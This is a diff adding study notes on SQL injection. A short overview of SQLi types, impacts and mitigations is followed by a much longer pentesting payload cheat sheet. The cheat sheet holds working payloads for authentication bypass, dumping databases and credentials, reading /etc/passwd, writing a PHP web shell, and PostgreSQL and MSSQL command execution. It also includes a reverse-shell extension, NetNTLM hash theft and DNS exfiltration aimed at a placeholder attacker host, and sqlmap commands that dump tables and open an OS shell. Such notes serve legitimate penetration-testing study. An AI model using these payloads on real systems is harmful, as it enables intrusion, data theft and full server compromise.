@@ -1,0 +1,96 @@
+Core Concept: SQL Injection occurs when an application misinterprets user-supplied input as executable database code rather than a string, changing the code's intended flow.
+
+Types of SQL Injection:
+
+In-band SQLi: The results of the query are displayed directly on the front-end page.
+Union-based: Leverages the UNION operator to combine the results of the original query with a newly injected query.
+
+Error-based: Intentionally causes an SQL error that returns the query output within the error message itself.
+
+Blind SQLi: The query results are not directly returned on the page, forcing the attacker to infer data.
+Boolean-based (Content-based): The attacker looks for differences in the HTTP response (like response length or content) to determine if the injected query evaluated to TRUE or FALSE.
+
+Time-based: The attacker uses commands like SLEEP() or WAITFOR DELAY to delay the server's response if a condition is TRUE.
+
+Out-of-band (OOB) SQLi: Used when direct responses or time delays are unfeasible. The attacker forces the database to send data to an external server they control (e.g., via DNS or HTTP requests).
+
+Second-Order SQLi: User input is stored safely in the database initially but is later retrieved and used unsafely in a different SQL query.
+
+
+Common Impacts:
+Bypassing authentication logic.
+Extracting sensitive data (passwords, credit cards, PII).
+Reading and writing files to the back-end server.
+Gaining Remote Code Execution (RCE) and full server compromise.
+
+
+Mitigation & Prevention:
+Parameterized Queries (Prepared Statements): The most effective defense. It passes the query and user input separately, allowing the database to differentiate between code and data.
+Input Validation & Sanitization: Using regular expressions to restrict input (e.g., allowing only letters/numbers) and escaping special characters (e.g., mysqli_real_escape_string).
+Principle of Least Privilege: Running database connections with minimally privileged accounts (never sa or root) and restricting unneeded permissions like FILE reads/writes or extensions.
+Web Application Firewalls (WAF): Using WAFs (like ModSecurity) to detect and block malicious input strings.
+---------------------------------------------------------------------------------------------------------------------------------------------
+
+SQL Injection Payload Cheat Sheet for Pentesting
+1. Authentication Bypass & Logic Subversion
+admin' or '1'='1 (Makes the overall WHERE clause true).
+admin'-- (Comments out password checks).
+admin')-- (Escapes nested parentheses and comments out the rest).
+
+2. Query Discovery & Fingerprinting
+Find number of columns:
+' ORDER BY 1-- -, ' ORDER BY 2-- - (Increment until an error occurs).
+' UNION select 1,2,3-- - (Increment numbers until no error is returned).
+
+Fingerprint MySQL/MariaDB:
+SELECT @@version (Returns version string).
+SELECT POW(1,1) (Returns 1).
+SELECT SLEEP(5) (Delays response by 5 seconds).
+Locate output columns: UNION select 1,@@version,3,4-- - (Find which number is printed on screen).
+
+3. Filter Evasion (PostgreSQL Examples)
+Bypassing space filters: Use PostgreSQL multi-line comments /**/ (e.g., '/**/and/**/1=1--).
+Bypassing single-quote filters: Use double dollar signs $$ for string literals (e.g., $$admin$$ instead of 'admin').
+
+4. Data Extraction (MySQL/PostgreSQL)
+Current User & Database: UNION select 1,user(),database(),4-- -.
+Dump Databases: UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -.
+Dump Tables: UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -.
+Dump Columns: UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -.
+Blind Data Extraction (Substring): maria' AND ASCII(SUBSTRING(password,1,1))=57-- -.
+
+5. MySQL Specific Advanced Payloads
+Read Files: UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- - (Requires FILE privilege).
+Check File Write Permissions: SELECT variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv" (Empty value means write access is allowed).
+Write Web Shell: cn' union select 1,'<?php system($_REQUEST); ?>',3,4 into outfile '/var/www/html/shell.php'-- -.
+
+6. PostgreSQL Specific Advanced Payloads
+Read Files (COPY): CREATE TABLE tmp (t TEXT); COPY tmp FROM '/etc/passwd'; SELECT * FROM tmp;.
+Write Files (COPY): INSERT INTO tmp VALUES ('payload'); COPY tmp TO '/tmp/proof.txt';.
+Read/Write via Large Objects: SELECT lo_import('/etc/passwd');, then SELECT lo_get(<object id>);.
+RCE (COPY FROM PROGRAM): COPY tmp FROM PROGRAM 'id'; (Requires pg_execute_server_program role).
+RCE (C Extension): Upload malicious .so file, then CREATE FUNCTION rev_shell(text, integer) RETURNS integer AS '/tmp/pg_rev_shell', 'rev_shell' LANGUAGE C STRICT;.
+
+7. MSSQL Specific Advanced Payloads
+Time-Based Delay: WAITFOR DELAY '0:0:10'.
+Read Files: SELECT BulkColumn FROM OPENROWSET(BULK 'C:\Windows\System32\flag.txt', SINGLE_CLOB) AS x (Requires ADMINISTER BULK OPERATIONS).
+Steal NetNTLM Hashes: EXEC master..xp_dirtree '\\<ATTACKER_IP>\myshare', 1, 1;-- (Forces the server to authenticate to your SMB server, catch with Responder).
+OOB DNS Exfiltration: DECLARE @T varchar(1024);SELECT @T=(SELECT 1234);EXEC('master..xp_dirtree "\\'+@T+'.YOUR.DOMAIN\x"');.
+RCE (xp_cmdshell):
+Enable it: ';exec sp_configure 'show advanced options','1';reconfigure;exec sp_configure 'xp_cmdshell','1';reconfigure;--.
+Execute command: ';exec xp_cmdshell 'ping /n 4 192.168.43.164';--.
+
+8. SQLMap Commands
+Basic Scan: sqlmap -u "http://target.com/vuln.php?id=1" --batch.
+Scan via Request File (Burp): sqlmap -r req.txt (Use * inside the file to mark specific injection points).
+Dump Database Table: sqlmap -u "URL" -D dbname -T tablename --dump.
+
+Tuning and Evasion:
+--level=5 --risk=3 (Maximized tests and payloads; high risk of altering DB).
+--random-agent (Bypasses basic WAF User-Agent blacklists).
+--tamper=between,randomcase,space2comment (Modifies payloads to evade WAF filters).
+
+OS Exploitation:
+Read File: --file-read "/etc/passwd".
+Write Shell: --file-write "shell.php" --file-dest "/var/www/html/shell.php".
+Pop OS Shell: --os-shell (Can specify technique like --technique=E for Error-based shells).
